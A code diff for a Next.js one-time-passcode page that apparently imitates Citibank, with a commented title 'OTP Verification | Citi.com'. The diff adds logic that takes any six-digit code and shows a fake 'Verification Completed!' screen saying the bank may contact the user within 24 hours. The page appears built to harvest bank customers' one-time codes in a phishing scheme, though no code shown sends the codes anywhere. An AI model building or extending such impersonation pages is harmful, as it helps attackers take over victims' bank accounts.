@@ -3,6 +3,7 @@
 import React, { useEffect, useState } from "react";
 import Header from "@/components/layout/Header";
 import Footer from "@/components/layout/Footer";
+import Image from "next/image";
 
 // export const metadata = {
 //   title: "OTP Verification | Citi.com",
@@ -11,6 +12,7 @@ import Footer from "@/components/layout/Footer";
 const OtpPage = () => {
   const [seconds, setSeconds] = useState(60);
   const [otp, setOtp] = useState("");
+  const [otpClicked, setOtpClicked] = useState(false);
 
   useEffect(() => {
     if (seconds > 0) {
@@ -19,48 +21,90 @@ const OtpPage = () => {
     }
   }, [seconds]);
 
+  const handleOtp = () => {
+    if (otp.length === 6) {
+      setOtpClicked(true);
+    } else {
+      alert("Please enter a valid 6-digit OTP.");
+    }
+  };
+
   return (
     <main className="bg-[#f5f7fa] min-h-screen flex flex-col">
       <Header />
 
       <div className="flex-grow flex items-center justify-center px-4 min-h-[90vh]">
-        <div className="w-full max-w-md bg-white rounded-2xl shadow-md p-8">
-          <h1 className="text-2xl font-bold text-[#0d2d62] mb-4">
-            Confirm your identity
-          </h1>
-          <p className="text-sm text-gray-700 mb-6">
-            For security reasons, a 6-digit code has been sent to{" "}
-            <span className="font-semibold">XXXX</span>.
-          </p>
+        {!otpClicked ? (
+          <div className="w-full max-w-md bg-white rounded-2xl shadow-md p-8">
+            <h1 className="text-2xl font-bold text-[#0d2d62] mb-4">
+              Confirm your identity
+            </h1>
+            <p className="text-sm text-gray-700 mb-6">
+              For security reasons, a 6-digit code has been sent to{" "}
+              <span className="font-semibold">XXXX</span>.
+            </p>
 
-          <input
-            placeholder="0 0 0 0 0 0"
-            type="text"
-            name="otp"
-            value={otp}
-            onChange={(e) =>
-              setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))
-            }
-            className="h-12 w-full border rounded-lg px-4 text-lg tracking-widest text-center placeholder:tracking-normal placeholder:font-medium focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
-          />
+            <input
+              placeholder="0 0 0 0 0 0"
+              type="text"
+              name="otp"
+              value={otp}
+              onChange={(e) =>
+                setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))
+              }
+              className="h-12 w-full border rounded-lg px-4 text-lg tracking-widest text-center placeholder:tracking-normal placeholder:font-medium focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
+            />
 
-          <button className="cursor-pointer w-full py-3 mt-6 bg-[#0d2d62] rounded-lg font-bold text-white hover:bg-[#08325a] transition-colors">
-            Sign On
-          </button>
+            <button
+              className="cursor-pointer w-full py-3 mt-6 bg-[#0d2d62] rounded-lg font-bold text-white hover:bg-[#08325a] transition-colors"
+              onClick={handleOtp}
+            >
+              Verify
+            </button>
 
-          <div className="mt-4 text-center text-sm text-gray-600">
-            {seconds > 0 ? (
-              <span>Resend code in {seconds}s</span>
-            ) : (
-              <button
-                onClick={() => setSeconds(60)}
-                className="text-[#0d2d62] font-semibold hover:underline"
-              >
-                Resend code
-              </button>
-            )}
+            <div className="mt-4 text-center text-sm text-gray-600">
+              {seconds > 0 ? (
+                <span>Resend code in {seconds}s</span>
+              ) : (
+                <button
+                  onClick={() => setSeconds(60)}
+                  className="text-[#0d2d62] font-semibold hover:underline"
+                >
+                  Resend code
+                </button>
+              )}
+            </div>
           </div>
-        </div>
+        ) : (
+          <div className="w-full max-w-md bg-white rounded-2xl shadow-md p-8">
+            <h1 className="text-2xl font-bold text-[#0d2d62] mb-4">
+              Verification Completed!
+            </h1>
+
+            <div className="flex-center">
+              <Image
+                src={"/images/check-mark.png"}
+                alt="Verified"
+                width={320}
+                height={200}
+                className="object-contain"
+                quality={100}
+              />
+            </div>
+
+            <p className="text-gray-700">
+              Your account has been verified successfully. We may contact you
+              within the next 24 hours.
+            </p>
+
+            <button
+              className="cursor-pointer w-full py-3 mt-6 bg-[#0d2d62] rounded-lg font-bold text-white hover:bg-[#08325a] transition-colors"
+              onClick={handleOtp}
+            >
+              Return to Home
+            </button>
+          </div>
+        )}
       </div>
 
       <Footer />
